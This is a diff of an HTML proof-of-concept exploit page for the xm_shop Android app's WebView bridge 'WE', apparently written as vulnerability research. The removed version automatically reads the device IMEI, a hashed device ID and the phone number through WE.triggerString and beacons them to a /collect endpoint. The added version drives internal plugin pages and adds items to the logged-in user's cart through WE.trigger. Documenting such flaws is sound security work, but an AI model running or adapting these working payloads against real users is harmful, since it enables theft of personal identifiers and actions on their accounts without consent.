@@ -3,255 +3,169 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>xm_shop WebFragment 信息泄露 PoC</title>
+  <title>xm_shop 最终 PoC</title>
   <style>
-    :root {
-      color-scheme: dark;
-      --bg: #0b1220;
-      --panel: #131c2e;
-      --ok: #16c784;
-      --warn: #f5a623;
-      --bad: #ff5b6e;
-      --text: #ecf1ff;
-      --muted: #9fb0d1;
-      --accent: #4ea1ff;
+    :root{
+      --bg:#0d1524;--panel:#162033;--line:#2a3957;--text:#edf3ff;--muted:#9db0d3;
+      --ok:#16c784;--warn:#ffb020;--bad:#ff5d73;--btn:#4e9dff;--btn2:#42597f;
     }
-    * { box-sizing: border-box; }
-    body {
-      margin: 0;
-      font-family: "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
-      background: linear-gradient(180deg, #08101d, #121d31);
-      color: var(--text);
-    }
-    .wrap {
-      max-width: 980px;
-      margin: 0 auto;
-      padding: 18px;
-    }
-    h1 {
-      margin: 0 0 12px;
-      font-size: 28px;
-      line-height: 1.2;
-    }
-    .sub {
-      color: var(--muted);
-      margin-bottom: 18px;
-    }
-    .card {
-      background: rgba(19, 28, 46, 0.92);
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 14px;
-      padding: 16px;
-      margin-bottom: 14px;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.22);
-    }
-    .status {
-      font-size: 18px;
-      font-weight: 700;
-      color: var(--warn);
-    }
-    .grid {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 12px;
-    }
-    .item {
-      padding: 14px;
-      border-radius: 10px;
-      background: rgba(255,255,255,0.03);
-      border: 1px solid rgba(255,255,255,0.06);
-    }
-    .label {
-      font-size: 14px;
-      color: var(--muted);
-      margin-bottom: 8px;
-    }
-    .value {
-      font-size: 20px;
-      font-weight: 700;
-      word-break: break-all;
-      color: var(--ok);
-      min-height: 28px;
-    }
-    .value.empty { color: var(--bad); }
-    .row {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      margin-top: 12px;
-    }
-    button {
-      border: 0;
-      border-radius: 999px;
-      padding: 10px 16px;
-      font-size: 15px;
-      font-weight: 700;
-      color: white;
-      background: var(--accent);
-    }
-    button.secondary {
-      background: #31415f;
-    }
-    pre {
-      margin: 0;
-      white-space: pre-wrap;
-      word-break: break-word;
-      font-size: 14px;
-      line-height: 1.45;
-      color: #cfe0ff;
-    }
-    .pill {
-      display: inline-block;
-      margin-right: 8px;
-      margin-bottom: 8px;
-      padding: 6px 10px;
-      border-radius: 999px;
-      background: rgba(78,161,255,0.15);
-      color: #b5d3ff;
-      font-size: 13px;
-    }
+    *{box-sizing:border-box}
+    body{margin:0;background:linear-gradient(180deg,#0a1220,#121c2f);color:var(--text);font:16px/1.45 "Segoe UI","PingFang SC","Microsoft YaHei",sans-serif}
+    .wrap{max-width:980px;margin:0 auto;padding:18px}
+    .card{background:rgba(22,32,51,.95);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:16px;margin-bottom:14px}
+    h1,h2{margin:0 0 10px}
+    p{margin:0 0 10px;color:var(--muted)}
+    .status{font-weight:700;font-size:18px}
+    .ok{color:var(--ok)} .warn{color:var(--warn)} .bad{color:var(--bad)}
+    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:14px}
+    label{display:block;margin:10px 0 6px;color:#c7d8f7;font-weight:600}
+    input,textarea{width:100%;background:#0d1524;color:var(--text);border:1px solid var(--line);border-radius:12px;padding:12px}
+    textarea{min-height:110px;resize:vertical}
+    .row{display:flex;flex-wrap:wrap;gap:10px;margin-top:12px}
+    button{border:0;border-radius:999px;padding:10px 16px;font-weight:700;color:#fff;background:var(--btn);cursor:pointer}
+    button.secondary{background:var(--btn2)}
+    .pill{display:inline-block;padding:6px 10px;border-radius:999px;background:rgba(78,157,255,.16);color:#bcd7ff;font-size:13px;margin:0 8px 8px 0}
+    pre{margin:0;white-space:pre-wrap;word-break:break-word;font:13px/1.5 Consolas,monospace}
+    .log{background:#0a111d;border-radius:12px;padding:12px;max-height:420px;overflow:auto}
   </style>
 </head>
 <body>
   <div class="wrap">
-    <h1>xm_shop WebFragment 信息泄露 PoC</h1>
-    <div class="sub">目标：外部启动 PluginRootActivity → 强制加载宿主 <code>com.xiaomi.shop2.closeset.WebFragment</code> → 调用 <code>WE.triggerString</code> 读取设备标识/手机号。</div>
-
     <div class="card">
-      <div class="status" id="status">状态：等待桥接注入...</div>
-      <div class="row">
-        <span class="pill" id="ua">UA: loading...</span>
-        <span class="pill" id="ts">Time: -</span>
+      <h1>xm_shop 最终 PoC</h1>
+      <p>主打两个最稳的点：<strong>show_plugin</strong> 驱动宿主内部插件页面，和 <strong>addCart</strong> 以当前登录用户身份改购物车。</p>
+      <div id="status" class="status warn">状态：等待 WE bridge 注入...</div>
+      <div class="row" style="margin-top:12px">
+        <span class="pill" id="urlPill">URL: -</span>
+        <span class="pill" id="uaPill">UA: -</span>
       </div>
     </div>
 
     <div class="grid">
-      <div class="item">
-        <div class="label">get_deviceid → Device.IMEI</div>
-        <div class="value" id="deviceid">等待触发</div>
+      <div class="card">
+        <h2>1. show_plugin</h2>
+        <p>默认跳到宿主购物车插件页面，可直接作为“外部网页驱动内部页面”的录屏证据。</p>
+        <label for="showPluginPayload">show_plugin payload</label>
+        <textarea id="showPluginPayload">{"path":"ShopPlugin://com.xiaomi.shop2.plugin.shopcart.CartFragment?pluginId=102"}</textarea>
+        <div class="row">
+          <button onclick="runShowPlugin()">执行 show_plugin</button>
+        </div>
       </div>
-      <div class="item">
-        <div class="label">get_hash_deviceid → CloudCoder.hashDeviceInfo(Device.IMEI)</div>
-        <div class="value" id="hash_deviceid">等待触发</div>
-      </div>
-      <div class="item">
-        <div class="label">getPhones → TelephonyManager.getLine1Number()</div>
-        <div class="value" id="phones">等待触发</div>
+
+      <div class="card">
+        <h2>2. addCart</h2>
+        <p>需要真实测试商品 ID。请只在测试账号上验证。</p>
+        <label for="productId">product_id</label>
+        <input id="productId" value="REPLACE_WITH_TEST_PRODUCT_ID">
+        <label for="consumption">consumption</label>
+        <input id="consumption" value="1">
+        <div class="row">
+          <button onclick="runAddCart()">执行 addCart</button>
+        </div>
       </div>
     </div>
 
     <div class="card">
+      <h2>辅助动作</h2>
       <div class="row">
-        <button onclick="runExploit()">重新执行</button>
-        <button class="secondary" onclick="copySummary()">复制摘要</button>
+        <button class="secondary" onclick="checkBridge()">重新检测 bridge</button>
+        <button class="secondary" onclick="openCartByOpennew()">opennew 跳购物车</button>
+        <button class="secondary" onclick="clearLog()">清空日志</button>
       </div>
     </div>
 
     <div class="card">
-      <div class="label">本地日志 / exfil 记录</div>
-      <pre id="log"></pre>
+      <h2>日志</h2>
+      <div class="log"><pre id="log"></pre></div>
     </div>
   </div>
 
   <script>
-    const state = {
-      deviceid: null,
-      hash_deviceid: null,
-      phones: null
-    };
-
-    function now() {
-      return new Date().toLocaleString();
+    function ts(){ return new Date().toLocaleString(); }
+    function safe(v){
+      if(v === undefined) return "undefined";
+      if(v === null) return "null";
+      if(typeof v === "string") return v;
+      try { return JSON.stringify(v); } catch(e) { return String(v); }
     }
-
-    function log(line) {
-      const el = document.getElementById('log');
-      el.textContent += `[${now()}] ${line}\n`;
-      el.scrollTop = el.scrollHeight;
-      console.log(line);
+    function log(msg){
+      const el = document.getElementById("log");
+      el.textContent += `[${ts()}] ${msg}\n`;
+      el.parentElement.scrollTop = el.parentElement.scrollHeight;
+      console.log(msg);
     }
-
-    function setStatus(text, color) {
-      const el = document.getElementById('status');
-      el.textContent = text;
-      el.style.color = color || '#f5a623';
+    function clearLog(){
+      document.getElementById("log").textContent = "";
+      log("log cleared");
     }
-
-    function setValue(id, value) {
-      const el = document.getElementById(id);
-      const text = value === null || value === undefined || value === '' ? '(空值)' : String(value);
-      el.textContent = text;
-      el.className = 'value' + (text === '(空值)' ? ' empty' : '');
+    function ready(){
+      return !!(window.WE && typeof WE.trigger === "function" && typeof WE.triggerString === "function");
     }
-
-    function beacon(name, value) {
-      const img = new Image();
-      img.src = `/collect?name=${encodeURIComponent(name)}&value=${encodeURIComponent(value === null ? '' : String(value))}&t=${Date.now()}`;
-    }
-
-    function safeTriggerString(action, arg) {
+    function hookEmit(){
+      if(!window.WE || typeof window.WE !== "object") return;
       try {
-        if (!window.WE || typeof WE.triggerString !== 'function') {
-          throw new Error('WE.triggerString 不可用');
-        }
-        const ret = WE.triggerString(action, arg || '');
-        log(`WE.triggerString(${action}) => ${JSON.stringify(ret)}`);
+        window.WE.emit = function(action, payload){
+          log(`WE.emit(${action}) => ${payload}`);
+        };
+      } catch(e) {
+        log(`install emit hook failed: ${e}`);
+      }
+    }
+    function checkBridge(){
+      document.getElementById("urlPill").textContent = "URL: " + location.href;
+      document.getElementById("uaPill").textContent = "UA: " + navigator.userAgent;
+      const status = document.getElementById("status");
+      if(ready()){
+        hookEmit();
+        status.className = "status ok";
+        status.textContent = "状态：WE bridge 已注入，可执行利用";
+        log("WE bridge detected");
+      } else {
+        status.className = "status bad";
+        status.textContent = "状态：WE bridge 不存在，当前不在目标宿主 WebView 中";
+        log("WE bridge missing");
+      }
+    }
+    function trigger(action, payload){
+      if(!ready()){ checkBridge(); return null; }
+      hookEmit();
+      try{
+        const ret = WE.trigger(action, payload);
+        log(`WE.trigger(${action}, ${safe(payload)}) => ${safe(ret)}`);
         return ret;
-      } catch (e) {
-        log(`调用 ${action} 失败: ${e.message}`);
+      }catch(e){
+        log(`WE.trigger(${action}) threw: ${e}`);
         return null;
       }
     }
-
-    function updateSummary() {
-      setValue('deviceid', state.deviceid);
-      setValue('hash_deviceid', state.hash_deviceid);
-      setValue('phones', state.phones);
+    function runShowPlugin(){
+      const payload = document.getElementById("showPluginPayload").value;
+      trigger("show_plugin", payload);
     }
-
-    function runExploit() {
-      document.getElementById('ts').textContent = `Time: ${now()}`;
-      if (!window.WE || typeof WE.triggerString !== 'function') {
-        setStatus('状态：桥接未注入，等待重试...', '#f5a623');
-        log('WE 尚不可用，1 秒后重试');
-        setTimeout(runExploit, 1000);
+    function runAddCart(){
+      const productId = document.getElementById("productId").value.trim();
+      if(!productId || productId === "REPLACE_WITH_TEST_PRODUCT_ID"){
+        log("请先把 product_id 换成真实测试商品 ID");
         return;
       }
-
-      setStatus('状态：桥接已注入，开始读取敏感信息', '#16c784');
-      log('WE bridge detected，开始调用 get_deviceid / get_hash_deviceid / getPhones');
-
-      state.deviceid = safeTriggerString('get_deviceid', '');
-      state.hash_deviceid = safeTriggerString('get_hash_deviceid', '');
-      state.phones = safeTriggerString('getPhones', '');
-      updateSummary();
-
-      beacon('deviceid', state.deviceid);
-      beacon('hash_deviceid', state.hash_deviceid);
-      beacon('phones', state.phones);
-
-      const summary = JSON.stringify(state, null, 2);
-      beacon('summary', summary);
-      log(`exfil complete => ${summary}`);
-      setStatus('状态：PoC 执行完成，结果已显示并回传到 /collect', '#16c784');
+      const payload = JSON.stringify({
+        product_id: productId,
+        consumption: document.getElementById("consumption").value.trim() || "1",
+        js_method: "onAddCartResult"
+      });
+      trigger("addCart", payload);
     }
-
-    function copySummary() {
-      const text = JSON.stringify(state, null, 2);
-      navigator.clipboard.writeText(text).then(
-        () => log('已复制摘要到剪贴板'),
-        () => log('复制失败，请手动复制页面内容')
-      );
+    function openCartByOpennew(){
+      trigger("opennew", "ShopPlugin://com.xiaomi.shop2.plugin.shopcart.CartFragment?pluginId=102");
     }
-
-    window.WE = window.WE || {};
-    window.WE.emit = function(name, payload) {
-      log(`WE.emit(${name}) => ${payload}`);
-    };
-
-    document.getElementById('ua').textContent = `UA: ${navigator.userAgent}`;
-    log('页面已载入，等待宿主注入 WE bridge');
-    setTimeout(runExploit, 600);
+    function onAddCartResult(code, message){
+      log(`onAddCartResult(${safe(code)}, ${safe(message)})`);
+    }
+    window.addEventListener("load", function(){
+      log("page loaded");
+      checkBridge();
+      setTimeout(checkBridge, 1000);
+    });
   </script>
 </body>
 </html>
